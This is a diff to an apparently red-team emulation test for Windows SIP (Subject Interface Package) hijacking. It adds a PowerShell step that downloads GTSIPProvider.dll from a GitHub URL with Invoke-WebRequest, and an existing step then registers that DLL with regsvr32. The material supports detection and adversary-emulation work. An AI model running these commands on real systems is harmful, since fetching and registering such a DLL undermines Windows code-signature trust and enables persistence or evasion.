@@ -17,6 +17,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})
+      inline: |
+        if (Test-Path "#{dll_payload}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}"
+        }}
+      executor: powershell
     - name: sip-(subject-interface-package)-hijacking-via-custom-dll
       inline: |
         regsvr32.exe {{.Args.dll_payload}}
